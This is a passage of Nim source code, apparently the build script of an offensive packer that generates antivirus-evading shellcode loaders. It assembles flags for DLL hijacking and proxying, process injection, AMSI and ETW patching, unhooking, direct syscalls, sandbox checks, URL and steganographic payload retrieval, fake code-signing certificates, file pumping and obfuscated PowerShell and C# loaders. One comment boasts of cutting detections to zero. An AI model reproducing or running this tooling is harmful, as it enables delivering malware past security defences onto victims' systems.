                NewDllCustomPayloadFuncStub = NewDllCustomPayloadFuncStub.replace("REPLACEMUTEX", mutexname)
            stub.add(NewDllCustomPayloadFuncStub)
    else:
        stub.add(DllStub)
        if(dllhijack):
            if(perfectdllhijack):
                var tempStub = PerfectDLLHijackStub
                if(mutexoneshot):
                    # replace with random mutex name
                    var mutexname = rndStr(8)
                    tempStub = tempStub.replace("REPLACEMUTEX", mutexname)
                if(execute_in_proc):
                    tempStub = tempStub.replace("EXENAME", execute_in)
                    stub.add(tempStub)
                else:
                    stub.add(tempStub)
            else:
                var NewDLLHijackStub = DLLHijackStub
                if(mutexoneshot):
                    # replace with random mutex name
                    var mutexname = rndStr(8)
                    NewDLLHijackStub = NewDLLHijackStub.replace("REPLACEMUTEX", mutexname)
                if(execute_in_proc):
                    NewDLLHijackStub = NewDLLHijackStub.replace("EXENAME", execute_in)
                    stub.add(NewDLLHijackStub)
                else:
                    stub.add(NewDLLHijackStub)
    for f in dllexportfunctions:
        stub.add(DllCustomExportStub)
        stub = stub.replace("FUNC_EXPORT", f)

if(service):
    if(dll_out):
        stub.add(ServiceDllStub)
    else:
        stub.add(ServiceStub)

if (debugMode):
    stub = stub.replace("import nimstrenc", "from winim import MODULEENTRY32A")


if(perfectdllhijack):
    stub = stub.replace("import nimstrenc", "")
    stub = stub.replace("when not defined(proxy):", "")
    stub = stub.replace("when defined(notcloned):", "")

writeFile("Loader.nim", stub)
echo "Written Loader.nim -> \n\n"

var randValue: string = rndStr(8)
if(dllProxy):
    # No Support for multiple DLL files at the moment. So the last one found will be used.
    var paths: seq[string] = @[]
    when system.hostOS == "windows":
        for path in walkFiles(fmt"{packerpath}\\build\\*.dll"):
            paths.add path
    else:
        for path in walkFiles(fmt"{packerpath}/build/*.dll"):
            paths.add path
    if paths == @[]:
        echo fmt"No DLL files found in the {packerpath}/build/ folder. You need to put the legit DLL to proxy into this directory. Exiting..."
        quit(1)
    for dllpath in paths:
        let (dir, dllName, ext) = splitFile(dllpath)
        when system.hostOS == "windows":
            echo os.execShellCmd(fmt"copy {dllpath} {packerpath}\\{randValue}.dll")
            echo os.execShellCmd(fmt"{packerpath}\\dllProxy\\gen_def.exe {randValue}.dll > {packerpath}/build/{randValue}.def")
            if noRandom:
                # remove the random dll name
                echo os.execShellCmd(fmt"del {randValue}.dll")
                # set output file name to dllName
                outfile = dllName & ext
                # Read {packerpath}/Loader.nim and replace PAYLOADDLL with the actual DLL name
                var packstub = readFile("Loader.nim")
                packstub = packstub.replace("PAYLOADDLL", fmt"C:\\windows\\system32\\{outfile}")
                # Write the new Loader.nim
                writeFile("Loader.nim", packstub)
            else:
                var packstub = readFile("Loader.nim")
                packstub = packstub.replace("PAYLOADDLL", fmt"{randValue}.dll")
                writeFile("Loader.nim", packstub)

        else:
            echo exec_cmd_ex(fmt"cp {dllpath} {packerpath}/{randValue}.dll")
            echo exec_cmd_ex(fmt"python {packerpath}/dllProxy/gen_def.py {randValue}.dll > {packerpath}/build/{randValue}.def")
            if noRandom:
                # remove the random dll name
                echo exec_cmd_ex(fmt"rm {randValue}.dll")
                outfile = dllName & ext
                var packstub = readFile("Loader.nim")
                packstub = packstub.replace("PAYLOADDLL", fmt"C:\windows\system32\{outfile}")
                writeFile("Loader.nim", packstub)

            else:
                var packstub = readFile("Loader.nim")
                packstub = packstub.replace("PAYLOADDLL", fmt"{randValue}.dll")
                writeFile("Loader.nim", packstub)
    # if payloadFunction != "", remove this function from the generated .def file. We just remove the whole line where it's defined
    if (payloadFunction != ""):
        var defFile: string = readFile(fmt"{packerpath}/build/{randValue}.def")
        var lines: seq[string] = defFile.splitLines()
        var newLines: seq[string] = @[]
        var dllpath: string = paths[0]
        let (dir, dllName, ext) = splitFile(dllpath)
        for line in lines:
            var newLine = line
            if noRandom:
                # replace the randValue in each line with the actual DLL name plus C:\windows\system32\ in front
                newLine = line.replace(randValue, fmt"C:\windows\system32\{dllName}")
                # replace C:\ with "C:\
                newLine = newLine.replace("C:\\", "\"C:\\")
                # replace whitespace + @ with ", but not if the line contains NimMain
                if "NimMain" notin newLine:
                    newLine = newLine.replace(" @", "\" @")
            if payloadFunction in newLine:
                # remove C:\windows\system32\ from the line
                newLine = fmt"    {payloadFunction}={payloadFunction}Fwd"
            newLines.add(newLine)
        writeFile(fmt"{packerpath}/build/{randValue}.def", newLines.join("\n"))


# --hint[Pattern]:off is used to not break nim-strenc - https://github.com/Yardanico/nim-strenc/issues/6
# This is only for the best size: -d:danger -d:strip --passc=-flto --passl=-flto / But it also bypasses three more vendors on antiscan.me from 3 up to 0 detections :)
# --passc=-flto --passl=-flto are not compatible with Hellsgate as they break the functionality

var basicCompileFlags: string = ""

discard exec_cmd_ex("nimgrep \"@@@\" --replace \\\"\\\"\\\" Loader.nim")

if (hellsgate):
    echo "Replacing === with \"\"\" for ASM stubs before compiling:\n"
    discard exec_cmd_ex("nimgrep === --replace \\\"\\\"\\\" Loader.nim")

if (llvm):
    echo "[+] Using LLVM-Obfuscator to compile"
    if system.hostOS == "linux":
        # Stolen from https://github.com/icyguider/Nimcrypt2/blob/main/nimcrypt.nim#L710
        var result = execCmdEx("x86_64-w64-mingw32-clang -v")
        if "Obfuscator-LLVM" in result.output:
            let ochars = {'A'..'Z','0'..'9'}
            var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
            #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
            basicCompileFlags.add(fmt"nim c -d=release --hint:pattern:off --warning:all:off --cc:clang --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}'")
        else:
            echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
            quit()
    when system.hostOS == "windows":
        var result = execCmdEx("clang -v")
        if "Obfuscator-LLVM" in result.output:
            let ochars = {'A'..'Z','0'..'9'}
            var aesSeed = collect(newSeq, (for i in 0..<32: ochars.sample)).join
            #Feel free to modify the Obfuscator-LLVM flags in the command below to fit your needs.
            basicCompileFlags.add(fmt"nim c -d=release --hint:pattern:off --warning:all:off --cc:clang --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}'")
        else:
            echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
            quit()
elif system.hostOS == "windows":
    # there's a bug in my modified denim, which makes "--" out of "-d" for the first argument when using multiple arguments, so only one can be accepted at the moment
    if (denim):
        basicCompileFlags = "-d:release --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader    
    else:
        basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes -d:nimNoLibc -d:noSignalHandler --gc:none -d:noSignalHandler --infChecks:off --stdout:off --hotCodeReloading:off --stackTraceMsgs:off --tlsEmulation:off --nanChecks:off -d:nimBuiltinSetjmp --sinkInference:off --deepcopy:off --styleCheck:off --skipParentCfg " # -d:noRes is used to not embed a winim manifest in the loader
elif system.hostOS == "linux":
    basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes -d:nimNoLibc -d:noSignalHandler --gc:none -d:noSignalHandler --infChecks:off --stdout:off --hotCodeReloading:off --stackTraceMsgs:off --tlsEmulation:off --nanChecks:off -d:nimBuiltinSetjmp --sinkInference:off --deepcopy:off --styleCheck:off --skipParentCfg " # -d:noRes is used to not embed a winim manifest in the loader

if((existingprocessInjection == false) and (remoteinject) and (not conhostinject)):
    basicCompileFlags.add("-d:spawninject ")

if(conhostinject):
    basicCompileFlags.add("-d:conhostinject ")

# if dllexportfunctions sequence is not empty, add -d:dllexportfuncs
if args["--dllexportfunc"]:
    basicCompileFlags.add("-d:dllexportfuncs ")

if(mutexoneshot):
    basicCompileFlags.add("-d:mutexoneshot ")

if (retrieveFromFile):
    stub.add(ShellcodefromFileStub)
elif (retrieveFromURL):
    stub.add(ShellcodefromURLStub)
else:
    basicCompileFlags.add("-d:PayloadEmbedded ")

if(execute_in_proc):
    basicCompileFlags.add("-d:execute_in_proc ")

if(customKey):
    basicCompileFlags.add("-d:customKey ")

if(environmentalDomain):
    basicCompileFlags.add("-d:environmentalDomain ")

if(usekeyFile or usednsKey or webKey or environmentalDomain or environmentalUsername):
    basicCompileFlags.add("-d:noKey ")
    if(useKeyFile):
        basicCompileFlags.add("-d:keyFromFile ")
    elif(usednsKey):
        basicCompileFlags.add("-d:dnsKey ")
    elif(webKey):
        basicCompileFlags.add("-d:webKey ")
    elif(environmentalDomain or environmentalUsername):
        basicCompileFlags.add("-d:environmentalKey ")

if(stomb):
    basicCompileFlags.add("-d:stomb ")

if(restore):
    basicCompileFlags.add("-d:restore ")

if (carokann):
    basicCompileFlags.add("-d:carokann ")

if(suspended):
    basicCompileFlags.add("-d:suspended ")

if(dripallocate):
    basicCompileFlags.add("-d:AllocateDripStyle ")

if(antidebug):
    basicCompileFlags.add("-d:AntiDebug ")

if(useStego):
    basicCompileFlags.add("-d:Stego ")

if(macPayload):
    basicCompileFlags.add("-d:macPayload ")

if(ClrPatch):
    basicCompileFlags.add("-d:ClrPatch ")

# if dllNames contains clr.dll, add -d:unhookclr
if (dllNames.contains("clr.dll")):
    basicCompileFlags.add("-d:unhookclr ")

if(unhook):
    basicCompileFlags.add("-d:unhook ")

if(psout or csout):
    basicCompileFlags.add("-d:powershell ")

if(useQueueAPC):
    basicCompileFlags.add("-d:QueueAPC ")

if(not defaultSandBoxChecks):
    basicCompileFlags.add("-d:SkipDefaultSandBoxChecks ")

if(ruylopez):
    basicCompileFlags.add("-d:ruylopez ")

if(ETW):
    basicCompileFlags.add("-d:HardwareETW ")

if(AMSIProviderPatch):
    basicCompileFlags.add("-d:ProviderPatch ")

if(peload):
    basicCompileFlags.add("-d:peload ")

if(RWX == false):
    basicCompileFlags.add("-d:RX ")

if(jmpEntry):
    basicCompileFlags.add("-d:JmpEntry ")

if(selfdelete):
    basicCompileFlags.add("-d:SelfDelete ")

if(AMSI and oneShot):
    basicCompileFlags.add("-d:oneshot ")

if (dllProxy):
    basicCompileFlags.add("--mm:none --threads:on ") # ORC breaks compilation with new anti Emulation checks

    basicCompileFlags.add("-d:proxy ")

# if payloadFunction is not empty, add -d:payloadFunc
if (payloadFunction != ""):
    basicCompileFlags.add(fmt"-d:payloadFunc ")

if(service):
    basicCompileFlags.add("-d:service ")

if(unhook):
    basicCompileFlags.add("-d:unhook ")

if(threadless):
    basicCompileFlags.add("-d:threadless ")

if(usepoolparty):
    basicCompileFlags.add("-d:poolparty ")
    basicCompileFlags.add(fmt"-d:variant{poolparty} ")

if (threadlessthread):
    basicCompileFlags.add("-d:threadlessthread ")

# add --passc=-static
basicCompileFlags.add("--passc=-static --passl=-static ")

# Newer mingw-w64 / ld defaults to a high image base (e.g. 0x140000000) which
# overflows 32-bit signed relocations (R_X86_64_32S against .bss) when linking
# statically. Force a low image base to keep -static links working with modern GCC.
basicCompileFlags.add("--passl:-Wl,--image-base=0x10000 ")

if(dllProxy):
    when system.hostOS == "windows":
        basicCompileFlags.add(fmt" --passl:{packerpath}\\build\\{randValue}.def ")
    else:
        basicCompileFlags.add(fmt" --passl:{packerpath}/build/{randValue}.def ")

if(denim):
    basicCompileFlags.add("-d:denim ")

if(callbackexecute):
    basicCompileFlags.add("-d:Callback ")

if(wait):
    basicCompileFlags.add("-d:wait ")

if(blockDLLs):
    basicCompileFlags.add("-d:blockDLLs ")

if(csharp):
    basicCompileFlags.add("-d:csharp ")

if(gosleep):
    basicCompileFlags.add("-d:sleep ")

if(remoteinject):
    basicCompileFlags.add("-d:remoteinject ")
else:
    basicCompileFlags.add("-d:localinject ")
if(remoteMapSection):
    basicCompileFlags.add("-d:remoteMapSection ")

if(COMVARETW):
    basicCompileFlags.add("-d:COMVARETW ")

if(service):
    basicCompileFlags.add("--mm:none ")

if (noNimMain):
    when system.hostOS == "windows":
        basicCompileFlags.add(fmt"--passl:{packerPath}\\dllProxy\nonimmain.def ")
    else:
        basicCompileFlags.add(fmt"--passl:{packerPath}/dllProxy/nonimmain.def ")

if (retrieveFromURL):
    if(shellcodeURL.contains("https") or shellcodeURL.contains("HTTPS")):
        basicCompileFlags.add("-d:ssl ")
    elif(not shellcodeURL.contains("http")):
        echo "[!] URL must contain http:// or https://"
        quit()
    else:
        basicCompileFlags.add("-d:http ")

if(hellsgate):
    basicCompileFlags.add("-d:Hellsgate ")
elif(getfreshstub):
    basicCompileFlags.add("-d:GetSyscallStub ")
elif(syswhispers):
    basicCompileFlags.add("-d:SysWhispers ")

if (verbose):
    basicCompileFlags.add("-d:verbose ")

if (dllClone == false):
    basicCompileFlags.add("-d:notcloned ")

if embeddedArguments:
    basicCompileFlags.add("-d:args ")

if ((dllProxy == false) #[and (dllClone == false)]#):
    basicCompileFlags.add("-d:defaultMain ")

if(dllClone):
    basicCompileFlags.add("--mm:none ")
    basicCompileFlags.add("-d:cloned ")

if (big):
    basicCompileFlags.add("--maxLoopIterationsVM:1000000000 ")

if (metadata and (not compileX86)): # compiled .o files only work for x64, didnt compile for x86 so far
    if (dll_out or cpl or xll):
        when system.hostOS == "windows":
            basicCompileFlags.add(fmt"--passL:{packerPath}\\resource\\dll.o ")
        else:
            basicCompileFlags.add(fmt"--passL:{packerPath}/resource/dll.o ")    
    else:
        when system.hostOS == "windows":
            basicCompileFlags.add(fmt"--passL:{packerPath}\\resource\\cmd.o ")
        else:
            basicCompileFlags.add(fmt"--passL:{packerPath}/resource/cmd.o ")

if(fluctuate):
    basicCompileFlags.add(fmt"-d:Fluctuate ")

if (compileX86):
    basicCompileFlags.add("--cpu:i386 ")

if (wow64):
    basicCompileFlags.add("-d:wow64 ")

if(xll):
    basicCompileFlags.add("-d:xll ")

if not noDInvoke:
    basicCompileFlags.add("-d:DInvoke ")

if (spoofArgs != ""):
    basicCompileFlags.add(fmt"-d:spoof_args ")

if (sleepinbetween > 0):
    basicCompileFlags.add(fmt"-d:sleepinbetween ")

if localCreateThread:
    basicCompileFlags.add("-d:LocalCreateThread ")

if perfectdllhijack:
    basicCompileFlags.add("-d:perfecthijack ")

if (dll_out or cpl or xll):
    #if (processname == ""): # Why did I do that? It make no sense.
    #    basicCompileFlags.add("--app=lib --nomain -d:lib_only ")
    #else:
    basicCompileFlags.add("--app=lib -d:lib_only --nomain ")
else:
    if(hide):
        basicCompileFlags.add("--app=gui ")
    else:
        basicCompileFlags.add("--app=console ")
    if (reflective):
        basicCompileFlags.add("--passL:-Wl,--dynamicbase,--export-all-symbols ")


if((syswhispers != true) and (hellsgate != true)):
    if system.hostOS == "windows":
        basicCompileFlags.add("--passc=-flto --passl=-flto ")

# for e.g. CNA Scripts
when system.hostOS == "windows":
    if (denim):
        basicCompileFlags.add(fmt"-p:""{packerPath}""")
    else:
        basicCompileFlags.add(fmt"-p:""{packerPath}"" ")
else:
    basicCompileFlags.add(fmt"-p:'{packerPath}' ")

if(denim == false):
    basicCompileFlags.add(fmt"--out={outfile} Loader.nim")

if debugMode:
    basicCompileFlags = basicCompileFlags.replace("-d:release", "-d:debug")
    basicCompileFlags = basicCompileFlags.replace("--hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size", "")
    basicCompileFlags = basicCompileFlags.replace("--app=console --passc=-flto --passl=-flto", "")

echo "Compile command:"
echo basicCompileFlags
echo "\n\n"

if(sourceonly):
    if(psout or dllproxy or denim or replace or dllclone or csout):
        echo "[!] You specified one of psout, csout, dllproxy, dllclone, denim or replace. That has to be done by yourself as you also specified sourceonly."
    quit()

when system.hostOS == "windows":
    if (denim):
        var exist: bool = fileExists(".\\denim\\denim.exe")
        # cause some compile problems
        basicCompileFlags = basicCompileFlags.replace("--passc=-flto --passl=-flto ", "")
        basicCompileFlags = basicCompileFlags.replace("-d:danger -d:strip ", "")
        if (exist):
            # An additional whitespace at the end causes an compiler error here, so we'll remove it
            basicCompileFlags = basicCompileFlags.replace(" \r\n", "")
            stub = stub.replace("        import nimstrenc", "")
            stub = stub.replace("    import nimstrenc", "")
            stub = stub.replace("when not defined(proxy):", "")
            stub = stub.replace("when defined(notcloned):", "")
            stub = stub.replace("    when defined(notcloned):", "")
            writeFile("Loader.nim", stub)

            echo "Denim compile argument: \r\n"

            echo fmt".\\denim\\denim.exe compile Loader.nim -A ""{basicCompileFlags}""\r\n"
            discard os.execShellCmd(fmt".\\denim\\denim.exe compile Loader.nim -A ""{basicCompileFlags}""")
            
            var exists: bool = true
            try:
                var fileCheck = readFile("Loader.exe")
            except:
                exists = false
            if(exists):
                let msg = fmt"[!] Encrypted file saved as 'Loader.exe' (--output FileName is ignored by denim)"
                echo "\n" & msg
                if(replace):
                    var randstring: string = rndStr(2)
                    echo fmt"[!] ---> replacing nim with {randstring} "
                    discard exec_cmd_ex(fmt"nimgrep nim --replace {randstring} {outfile}")
            else:
                echo "\r\nCompilation failed! Check the error message\r\n"
                quit()
elif system.hostOS == "linux":
    if (denim):
        echo "No Denim support for Linux systems, sorry!"

discard os.execShellCmd(basicCompileFlags)

proc replaceList () =
    var words: seq[string]
    var dictionary: string
    when system.hostOS == "windows":
        dictionary = "Dicts\\toReplace.txt"
    else:
        dictionary = "Dicts/toReplace.txt"
    for line in lines dictionary:
      words.add(line)
    var length: int = len(words) - 1
    for i in 0..length:
        var wordLength: int = len(words[i])
        var replacelength = wordLength - 1
        #echo words[i]
        #echo wordLength
        var randstring: string = rndStr(replacelength)
        echo fmt"[!] ---> replacing {words[i]} with {randstring} "
        var command: string = fmt"nimgrep ""{words[i]}"""
        command.add(fmt" --replace {randstring} {outfile}")
        echo command
        discard exec_cmd_ex(command)


# we need a function here, that takes the output file and retrieves a list of all bytes from it separated with a "," and then replaces the egg string QWERQWERQWER in the file Script.ps1 with the list of bytes
proc WritePS1() =
    var exists: bool = true
    try:
        var fileCheck = readFile(fmt"{outfile}")
    except:
        exists = false
    if(exists):
        var file = open(fmt"{outfile}", fmRead)
        var bytes: seq[byte] = toByteSeq(file.readAll())
        file.close()
        var length: int = len(bytes) - 1
        var byteList: string = ""
        for i in 0..length:
            byteList.add(fmt"{bytes[i]},")
        byteList = byteList[0..^2]
        var script: string
        if(psobfs):
            script = PowershellObfsTemplate
        else:
            script = Powershelltemplate
        script = script.replace("QWERQWERQWER", byteList)

        # Now Obfuscate the Script by replacing all VAR0001 to VAR0999 variables with random strings as well as FUN001 to FUN999 functions, ERROR01 to ERROR99 error messages and so on
        var words: seq[string] = @["VAR", "FUN", "CONST", "ERROR", "LYRICS"]
        var wordlength: int = len(words) - 1
        var maxWords: int = 999
        if(psobfs):
            words[1] = "XXXXXX" # we don't want to replace any names, as that breaks functionality.
            words[2] = "XXXXXX"
            words[3] = "XXXXXX"
            words[0] = "XXXXXX"
            
        for i in 0..wordlength:
            if (words[i] == "VAR"):
                maxWords = 380
            elif (words[i] == "FUN"):
                maxWords = 100
            elif (words[i] == "CONST"):
                maxWords = 300
            elif (words[i] == "ERROR"):
                maxWords = 100
            if (words[i] == "LYRICS"):
                var lyrics: seq[string]
                var dictionary: string
                when system.hostOS == "windows":
                    dictionary = "Dicts\\lyrics.txt"
                else:
                    dictionary = "Dicts/lyrics.txt"
                for line in lines dictionary:
                    lyrics.add(line)
                var length: int = len(lyrics) - 1
                for j in 0..1150:
                    var randstring: string = ""
                    if(uselyrics):
                        for k in 0..10:
                            randstring.add(fmt"{lyrics[rand(0..length)]}")
                    #echo "Replacing " & fmt"{words[i]}{j:03d}" & " with " & randstring
                    script = script.replace(fmt"{words[i]}{j:03d}", randstring)
            else:
                for j in 0..maxWords:
                    var randstring: string = rndStr(10)
                    #echo "Replacing " & fmt"{words[i]}{j:03d}" & " with " & randstring
                    script = script.replace(fmt"{words[i]}{j:03d}", randstring)
            
            



        writeFile(fmt"{outfile}.ps1", script)
    else:
        echo fmt"[!] File {outfile} not found, skipping byte list creation"


# we need a function here, that takes the output file and retrieves a list of all bytes from it separated with a "," and then replaces the egg string QWERQWERQWER in the loader.cs file of the current directory
proc WriteCS() =
    var exists: bool = true
    try:
        var fileCheck = readFile(fmt"{outfile}")
    except:
        exists = false
    if(exists):
        var file = open(fmt"{outfile}", fmRead)
        var bytes: seq[byte] = toByteSeq(file.readAll())
        file.close()
        var length: int = len(bytes) - 1
        var byteList: string = ""
        for i in 0..length:
            byteList.add(fmt"{bytes[i]},")
        byteList = byteList[0..^2]
        var script: string = CStemplate
        script = script.replace("QWERQWERQWER", byteList)
        writeFile(fmt"{outfile}.cs", script)
        echo fmt"[!] Loader saved to {outfile}.cs"
        # Read Packer.csproj and replace TOREPLACE.cs with the new filename
        var exists: bool = true
        try:
            var fileCheck = readFile(fmt"{packerPath}\cstemplate")
        except:
            exists = false
        if(exists):
            var file = open(fmt"{packerPath}\cstemplate", fmRead)
            var filecontent: string = file.readAll()
            file.close()
            filecontent = filecontent.replace("TOREPLACE.cs", fmt"{outfile}.cs")
            writeFile(fmt"{packerPath}\Packer.csproj", filecontent)
            echo fmt"[!] Packer.csproj saved to {packerPath}\Packer.csproj"
        else:
            echo fmt"[!] File {packerPath}\cstemplate not found, skipping replacement of TOREPLACE.cs"

        # Print, that this can be compiled with csc.exe but add the unsafe code option. Give the exact command to compile it.
        echo "\r\n"
        echo fmt"[!] You can compile the C# Loader with the following command:"
        echo fmt"dotnet build --configuration Release Packer.csproj"

    else:
        echo fmt"[!] File {outfile} not found, skipping byte list creation"

if(replace):
    replaceList()

if(dll_out):
    if(dllclone):
        echo fmt"[!] Cloning the DLL {dllToClone} API imports via NetClone/PyClone:"
        when system.hostOS == "windows":
            echo "[*] Using NetClone with command:"
            echo fmt"{packerPath}\NetClone\NetClone.exe --target {outfile} --reference {dllToClone} --reference-path {dllToClone} -o {outfile}"
            discard os.execShellCmd(fmt"{packerPath}\NetClone\NetClone.exe --target {outfile} --reference {dllToClone} --reference-path {dllToClone} -o {outfile}")
        else:
            echo "[*] Using PyClone with command:"
            echo fmt"{packerPath}/NetClone/PyClone.py --target {outfile} --reference {dllToClone} --reference-path {dllToClone} -o {outfile}"
            discard os.execShellCmd(fmt"{packerPath}/NetClone/PyClone.py --target {outfile} --reference {dllToClone} --reference-path {dllToClone} -o {outfile}")


var exists: bool = false
if not(denim):
    try:
        var fileCheck = readFile(fmt"{outfile}")
        exists = true
    except:
        exists = false

if(exists):
    let msg = fmt"[!] Loader saved to {outfile}"
    echo "\n" & msg
    if(retrieveFromFile):
        echo fmt"[!] Encrypted Payload saved to {outStringShellcode}"
    if (callobfs):
        when system.hostOS == "windows":
            var outfileonlyname = outfile.replace(packerPath, "")
            echo "\r\nObfuscating some Windows API's via CallObfuscator:\r\n"
            echo exec_cmd_ex(fmt"cobf\cobf_x64.exe {outfile} cobf\{outfileonlyname} cobf\config.ini")
            echo "\r\n"
            echo fmt"Obfuscated binary saved to: cobf\{outfileonlyname}"
            outfile = packerPath & "\\" & fmt"cobf\{outfileonlyname}"
        else:
            echo "Only usable from a Windows OS, sorry!"

    if (sign):
        echo "[*] Using Limelighter to generate a fake code signing certificate for the binary"
        echo fmt"[*] The domain to spoof the certificate from will be {signdomain}"
        var extension: string = ".exe"
        if (cpl):
            extension = ".cpl"
        elif (xll):
            extension = ".xll"
        elif(dll_out):
            extension = ".dll"
        if system.hostOS == "linux":
            discard os.execShellCmd(fmt"{packerPath}/LimeLighter/Limelighter -Domain {signdomain} -I {outfile} -O {outfile}.Signed{extension}")
        when system.hostOS == "windows":
            discard os.execShellCmd(fmt"{packerPath}\LimeLighter\Limelighter.exe -Domain {signdomain} -I {outfile} -O {outfile}.Signed{extension}")
        if (dll_out):
            outfile.add(fmt".Signed{extension}")
        else:
            outfile.add(fmt".Signed{extension}")

    if (pump):
        for m in pumpargs:
            if(m == "size"):
                var pumpexecutable = readFile(outfile)
                var pumpzero: seq[byte] = @[byte 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00]
                proc pumpHard(number: int): seq[byte] =
                    var pump: seq[byte] = pumpzero
                    for i in 0 ..< number:
                        pump.add(pumpzero)
                    return pump
                var pumped: seq[byte] = pumpHard(rand(952182..1161782)) 
                var pumpsequence: seq[byte] = toByteSeq(pumpexecutable)
                pumpsequence.add(pumped)
                writeFile(fmt"{outfile}",pumpsequence)

    if (retrieveFromURL):
        echo fmt"[!] Make sure to host the {outStringShellcode} file on your webserver with the correct filename to have a working payload ;-)"

    if (dllProxy):
        if not noRandom:
            echo fmt"[!] Original DLL saved as {randValue}.dll - you need to copy both files into the target directory to have a working payload ;-)"
    
    if(scout):
        # Use donut again but this time with the outfile as input
        echo "[*] Using Donut to generate a shellcode from the binary"
        if system.hostOS == "linux":
            discard os.execShellCmd(fmt"{packerPath}/donut/donut --input:{outfile} -o {outfile}.bin -b 1 -z 1")
        when system.hostOS == "windows":
            discard os.execShellCmd(fmt"{packerPath}\donut\donut.exe --input:{outfile} -o {outfile}.bin -b 1 -z 1")
        echo "\r\n\r\n" & fmt"[!] Shellcode saved as {outfile}.bin"

    
    if(csout):
        WriteCS()
        if(psout):
            # Compile the C# Loader with dotnet build --configuration Release Packer.csproj via os.execShellCmd
            echo "\r\n"
            discard os.execShellCmd(fmt"dotnet build --configuration Release Packer.csproj")
            echo "\r\n"
            # get the bytes from the release file and replace the egg QWERQWERQWER in the script.ps1 file with the binary representation of the bytes, not seperated. Only 1 and 0 should be in it. like $var = "011010100101"
            # the compiled binary is under packerpath\bin\Release\net462\Packer.exe
            var file = open(fmt"{packerPath}\bin\Release\net462\Packer.exe", fmRead)
            var bytes: seq[byte] = toByteSeq(file.readAll())
            file.close()
            var length: int = len(bytes) - 1
            var byteList: string = ""
            for i in 0..length:
                byteList.add(fmt"{bytes[i]}_")
            byteList = byteList[0..^2]
            var script: string = CSPSTemplate
            script = script.replace("QWERQWER", byteList)
            # Replace the following variables with random Variable names: PEstring, Pummel,byteValues, pestring, byteArray, byteValues, RAS, Entry, Zack. "_" should be replaced with a random value out of #+~*§%&/()=?<>
            var words: seq[string] = @["PEstring", "Pummel", "byteValues", "byteArray", "byteValues", "RAS", "Zack", "_"]
            var randSpecial: seq[string] = @["#", "+", "~", "*", "§", "%", "&", "/", "=", "?", "<", ">"]
            var wordlength: int = len(words) - 1
            for i in 0..wordlength:
                var randstring: string
                if (words[i] == "_"):
                    randstring = randSpecial[rand(0..11)]
                else:
                    randstring = rndStr(rand(3..10))
                    
                #echo "Replacing " & fmt"{words[i]}" & " with " & randstring
                script = script.replace(fmt"{words[i]}", randstring)
            writeFile(fmt"{outfile}.ps1", script)
            echo fmt"[!] Powershell script saved to {outfile}.ps1"
            psout = false


    if(psout):
        WritePS1()
        echo "\r\nPowershell script saved to: " & fmt"{outfile}.ps1"
      







else:
    if not(denim):
        echo "\r\nCompilation failed!! Check the error message.\r\n"

if(useStego):
    echo "\r\n[*] The payload is saved in the image: " & stegofile & "\r\n"
    if not noRandom:
        echo "[*] You need to drop that image to the same directory as the loader to have a working payload ;-)"

#[Here comes a function, that takes an string as input and pushes that into a char array ]#
proc toByteSeq(s: string): seq[byte] =
    var result: seq[byte] = @[]
    for c in s:
        result.add(c.byte)
    return result
